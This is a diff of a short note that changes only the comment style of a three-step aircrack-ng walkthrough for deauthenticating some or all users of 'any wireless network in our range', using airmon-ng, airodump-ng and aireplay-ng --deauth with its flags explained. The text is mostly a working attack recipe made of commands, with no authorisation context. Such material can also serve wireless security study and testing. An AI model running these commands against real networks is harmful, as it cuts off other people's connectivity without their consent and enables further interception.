@@ -1,14 +1,14 @@
 We can deauthenticate all or some of the users on any wireless network in our range, doing the following:
 
 - airmon-ng [interface]
-	* Put our interface in monitor mode.
+	// Put our interface in monitor mode.
 - airodump-ng [mon#]
-	* Monitor the available APs using our monitor mode interface.
-	* Once connected, fire up another terminal window and run:
+	// Monitor the available APs using our monitor mode interface.
+	// Once connected, fire up another terminal window and run:
 - aireplay-ng --deauth [frames] -a [AP-BSSID] -h [BSSID] -c [User-BSSID] [mon#]
-	* frames = The number of the deauthentication frames sent to the AP.
-	* -a = The AP's BSSID (MAC Address).
-	* -h = Our BSSID.
-	* -c = The user we wish to deauthenticate, if not present, all users will be deauthenticated.
-	* mon# = Our interface in monitor mode.
+	// frames = The number of the deauthentication frames sent to the AP.
+	// -a = The AP's BSSID (MAC Address).
+	// -h = Our BSSID.
+	// -c = The user we wish to deauthenticate, if not present, all users will be deauthenticated.
+	// mon# = Our interface in monitor mode.
 
